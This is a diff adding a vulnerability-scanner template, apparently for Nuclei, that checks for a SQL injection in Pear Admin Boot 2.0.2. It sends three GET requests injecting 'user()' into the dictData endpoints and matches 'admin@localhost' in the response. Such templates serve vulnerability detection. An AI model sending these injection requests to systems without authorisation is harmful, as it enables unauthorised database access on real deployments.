@@ -1,0 +1,26 @@
+id: pear-admin-boot-sqli
+
+info:
+  name: Pear Admin Boot - SQL Injection
+  author: qwtd
+  severity: high
+  description: |
+    在Pear Admin Boot 2.0.2版本中发现了一个漏洞，并被列为严重漏洞。此问题影响文件/system/dictData/getDictItems/的getDictItems函数。输入,user(),1,1 的操作会导致SQL注入。
+  reference:  
+    - https://github.com/wy876/POC/blob/17fce9e8a8e4c711753f586f24a2b8351f367aee/Pear%20Admin%20Boot/Pear-Admin-Boot%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  tags: Pear-Admin-Boot
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/system/dictData/getDictItems/gen_table,user(),1,1"
+      - "{{BaseURL}}/system/dictData/getDictItems/sys_user,user(),1"
+      - "{{BaseURL}}/system/dictData/loadDictItem/sys_user,user(),1?key=1"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "admin@localhost"
+      - type: status
+        status:
+          - 200
